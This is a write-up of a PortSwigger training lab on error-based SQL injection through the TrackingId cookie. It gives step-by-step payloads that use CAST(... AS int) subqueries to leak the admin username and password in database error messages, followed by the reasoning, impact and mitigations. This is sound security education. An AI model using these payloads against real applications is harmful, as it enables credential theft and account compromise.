# SQL Injection – Error-Based Data Extraction (Visible Errors)

# Vulnerability Overview
The application is vulnerable to SQL Injection via the TrackingId cookie. Database errors are returned in the response, allowing direct extraction of data through error messages. 

# Steps to Reproduce

**Lab Link** → https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

*Navigate to*
* /filter?category=Gifts

*Identify injection point (Cookie)*
* Intercept request using Burp Suite and modify TrackingId

* * TrackingId=xyz'

* * * Error: Unterminated string literal...

*Confirm error-based behavior*
* TrackingId=xyz' AND 1=cast((select 1)as int)--
* * No error

* TrackingId=xyz' AND 1=cast((select 1/0)as int)--
* * Error - division by zero  → Confirms error-based injection

*Extract username*
* TrackingId=' AND 1=cast((select username from users limit 1)as int)--
* * ERROR: invalid input syntax for type integer: "administrator"

*Extract password*
* TrackingId=' AND 1=cast((select password from users limit 1)as int)--
* * ERROR: invalid input syntax for type integer: "Password"

*Login*
* Username: administrator
* Password: extracted password

Successful login

# Why This Works

The CAST(... AS int) forces the database to convert the selected value into an integer.

* If the value is numeric → succeeds
* If the value is a string → error occurs

**The database includes the invalid value in the error message, leaking sensitive data.**

# Payload Used
* ' AND 1=cast((select username from users limit 1)as int)--
* ' AND 1=cast((select password from users limit 1)as int)--

# Impact
An attacker can directly extract sensitive data such as usernames and passwords via database error messages, leading to full account compromise.

# Tools Used
* Burp Suite (Proxy, Repeater)

# Mitigation
* Use parameterized queries
* Disable detailed database error messages
* Validate and sanitize input